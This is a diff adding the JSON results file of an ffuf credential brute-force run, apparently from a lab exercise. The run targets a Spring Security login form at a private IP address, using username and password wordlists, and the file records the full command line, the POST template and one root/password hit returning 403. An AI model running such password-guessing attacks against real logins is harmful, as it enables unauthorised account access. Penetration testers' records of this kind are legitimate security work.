@@ -1,0 +1,133 @@
+{
+  "commandline": "ffuf -request login.txt -request-proto http -mode clusterbomb -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt:USER -w /usr/share/seclists/Passwords/Common-Credentials/best110.txt:PASS -r -fc 302,401 -o login_out.json",
+  "time": "2024-02-01T17:55:40-05:00",
+  "results": [
+    {
+      "input": {
+        "FFUFHASH": "9d689540",
+        "PASS": "password",
+        "USER": "root"
+      },
+      "position": 1344,
+      "status": 403,
+      "length": 541,
+      "words": 306,
+      "lines": 8,
+      "content-type": "text/html;charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 34504525,
+      "resultfile": "",
+      "url": "http://10.129.157.196:8080/j_spring_security_check",
+      "host": "10.129.157.196:8080"
+    }
+  ],
+  "config": {
+    "autocalibration": false,
+    "autocalibration_keyword": "FUZZ",
+    "autocalibration_perhost": false,
+    "autocalibration_strategies": [
+      "basic"
+    ],
+    "autocalibration_strings": [],
+    "colors": false,
+    "cmdline": "ffuf -request login.txt -request-proto http -mode clusterbomb -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt:USER -w /usr/share/seclists/Passwords/Common-Credentials/best110.txt:PASS -r -fc 302,401 -o login_out.json",
+    "configfile": "",
+    "postdata": "j_username=USER&j_password=PASS&from=&Submit=Sign+in",
+    "debuglog": "",
+    "delay": {
+      "value": "0.00"
+    },
+    "dirsearch_compatibility": false,
+    "encoders": [],
+    "extensions": [],
+    "fmode": "or",
+    "follow_redirects": true,
+    "headers": {
+      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+      "Accept-Encoding": "gzip, deflate, br",
+      "Accept-Language": "en-US,en;q=0.5",
+      "Connection": "close",
+      "Content-Type": "application/x-www-form-urlencoded",
+      "Cookie": "screenResolution=1716x1251; JSESSIONID.ee7ce85c=node0qpj6n0oy8oi4vjy2vjurnyfl3.node0",
+      "Host": "10.129.157.196:8080",
+      "Origin": "http://10.129.157.196:8080",
+      "Referer": "http://10.129.157.196:8080/loginError",
+      "Upgrade-Insecure-Requests": "1",
+      "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+    },
+    "ignorebody": false,
+    "ignore_wordlist_comments": false,
+    "inputmode": "clusterbomb",
+    "cmd_inputnum": 100,
+    "inputproviders": [
+      {
+        "name": "wordlist",
+        "keyword": "USER",
+        "value": "/usr/share/seclists/Usernames/top-usernames-shortlist.txt",
+        "encoders": "",
+        "template": ""
+      },
+      {
+        "name": "wordlist",
+        "keyword": "PASS",
+        "value": "/usr/share/seclists/Passwords/Common-Credentials/best110.txt",
+        "encoders": "",
+        "template": ""
+      }
+    ],
+    "inputshell": "",
+    "json": false,
+    "matchers": {
+      "IsCalibrated": false,
+      "Mutex": {},
+      "Matchers": {
+        "status": {
+          "value": "200-299,301,302,307,401,403,405,500"
+        }
+      },
+      "Filters": {
+        "status": {
+          "value": "302,401"
+        }
+      },
+      "PerDomainFilters": {}
+    },
+    "mmode": "or",
+    "maxtime": 0,
+    "maxtime_job": 0,
+    "method": "POST",
+    "noninteractive": false,
+    "outputdirectory": "",
+    "outputfile": "login_out.json",
+    "outputformat": "json",
+    "OutputSkipEmptyFile": false,
+    "proxyurl": "",
+    "quiet": false,
+    "rate": 0,
+    "raw": false,
+    "recursion": false,
+    "recursion_depth": 0,
+    "recursion_strategy": "default",
+    "replayproxyurl": "",
+    "requestfile": "login.txt",
+    "requestproto": "http",
+    "scraperfile": "",
+    "scrapers": "all",
+    "sni": "",
+    "stop_403": false,
+    "stop_all": false,
+    "stop_errors": false,
+    "threads": 40,
+    "timeout": 10,
+    "url": "http://10.129.157.196:8080/j_spring_security_check",
+    "verbose": false,
+    "wordlists": [
+      "/usr/share/seclists/Usernames/top-usernames-shortlist.txt:USER",
+      "/usr/share/seclists/Passwords/Common-Credentials/best110.txt:PASS"
+    ],
+    "http2": false,
+    "client-cert": "",
+    "client-key": ""
+  }
+}
